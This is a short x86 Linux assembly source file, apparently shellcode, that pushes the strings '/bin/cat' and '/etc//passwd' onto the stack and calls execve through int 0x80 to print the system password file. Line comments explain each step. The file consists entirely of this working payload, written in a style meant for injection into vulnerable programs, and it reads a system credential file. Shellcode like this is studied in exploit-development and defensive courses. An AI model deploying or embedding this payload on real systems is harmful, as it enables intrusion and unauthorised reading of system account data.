global _start

section .text
_start:
        sub ecx,ecx             ;Zero out ECX
        push ecx                ;PUSH 0 on stack
        push dword 0x7461632f   ;Push tac/
        push dword 0x6e69622f   ;Push nib/
        mov ebx,esp             ;Pointer to /bin/cat
        push ecx                ;Push 0
        push dword 0x64777373   ;Push dwss
        push dword 0x61702f2f   ;ap//
        push dword 0x6374652f   ;cte/
        mov ecx,esp             ;Pointer to /etc//passwd
        push byte 0xb           ;Push 0xb
        pop eax                 ;EAX contains SYS_CALL no. 0xb for Execve call
        push byte 0x0           ;Push 0
        push ecx                ;/etc//passwd
        push ebx                ;/bin/cat
        mov ecx,esp
        int 0x80
